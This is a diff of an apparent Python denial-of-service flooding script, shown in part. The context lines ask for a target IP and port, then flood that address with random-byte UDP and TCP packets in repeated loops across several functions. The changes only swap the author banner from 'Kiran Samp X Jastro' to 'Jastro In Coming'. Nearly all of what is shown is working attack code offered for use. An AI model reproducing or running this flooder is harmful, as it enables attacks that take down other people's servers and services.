@@ -32,7 +32,7 @@ print("""───────▄▀▀▀▀▀▀▀▀▀▀▄▄
 ▀░░░▄▀░░░░░░░░░░▀░░░▀▀▀▀▄▄▄▄▄
 
 """)
-print("""KIRAN X JASTRO""")
+print("""JASTRO  COMING SON""")
 
 ip = str(input(" IP :"))
 port = int(input(" Port :"))
@@ -60,9 +60,9 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" Kiran Samp X Jastro")
+			print(i +"  Jastro In Coming")
 		except:
-			print("[!]  Kiran Samp X Jastro")
+			print("[!]  Jastro In Coming")
 
 def run2():
 	data = random._urandom(1204)
@@ -74,10 +74,10 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" Kiran Samp X Jastro")
+			print(i +" Jastro In Coming")
 		except:
 			s.close()
-			print("[*] Kiran Samp X Jastro")
+			print("[*] Jastro In Coming")
             
 
 def run3():
@@ -90,10 +90,10 @@ def run3():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" Kiran Samp X Jastro")
+			print(i +" Jastro In Coming")
 		except:
 			s.close()
-			print("[*] Kiran Samp X Jastro")
+			print("[*] Jastro In Coming")
             
   
 def run4():
@@ -106,10 +106,10 @@ def run4():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" Kiran Samp X Jastro")
+			print(i +" Jastro In Coming")
 		except:
 			s.close()
-			print("[*] Kiran Samp X Jastro")
+			print("[*] Jastro In Coming")
 			
 def run5():
 	data = random._urandom(16)
@@ -121,10 +121,10 @@ def run5():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" Kiran Samp X Jastro")
+			print(i +" Jastro In Coming")
 		except:
 			s.close()
-			print("[*] Kiran Samp X Jastro")
+			print("[*] Jastro In Coming")
             
 #Urandom Dan Pacotes
 class MyThread(threading.Thread):
